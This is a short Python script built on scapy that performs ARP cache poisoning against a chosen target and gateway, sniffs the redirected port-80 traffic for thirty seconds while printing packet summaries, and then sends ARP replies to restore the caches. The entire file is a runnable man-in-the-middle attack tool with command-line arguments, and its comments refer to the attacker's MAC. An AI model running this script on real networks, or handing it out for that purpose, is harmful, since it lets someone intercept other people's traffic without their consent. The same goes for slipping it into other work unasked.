import argparse
import time
from scapy.all import Ether, ARP
from scapy.layers.http import HTTPRequest
from scapy.sendrecv import srp, send, sniff


def get_mac(ip):
    packet = Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip)
    ans, _ = srp(packet, timeout=2, iface='en0', verbose=0)
    first_recv = ans[0][1]
    return first_recv.sprintf(r"%Ether.src%")


def send_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=0) # automatically includes attacker's MAC
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip), verbose=0) # automatically includes attacker's MAC


def send_antidote(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac), verbose=0)
    send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip, hwsrc=target_mac), verbose=0)


def get_http_sniffer(target_ip, port=80):
    filter = 'port 80' if port is None else 'port ' + str(port)
    sniff(filter=filter, prn=process_packet, iface='en0', store=False, timeout=30)


def process_packet(packet):
    print(packet.summary())
    # if packet.haslayer(HTTPRequest):
    #     request = packet[HTTPRequest]
    #     url = request.Host.decode() + request.Path.decode()
    #     print(url)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument('--targetIP', help='target IPV4 address')
    parser.add_argument('--gatewayIP', help='IPV4 address of the gateway (router)')
    args = parser.parse_args()

    gateway_mac = get_mac(args.gatewayIP)
    target_mac = get_mac(args.targetIP)
    
    send_poison(args.gatewayIP, gateway_mac, args.targetIP, target_mac)
    get_http_sniffer(args.targetIP, port=80)
    send_antidote(args.gatewayIP, gateway_mac, args.targetIP, target_mac)


if __name__ == '__main__':
    main()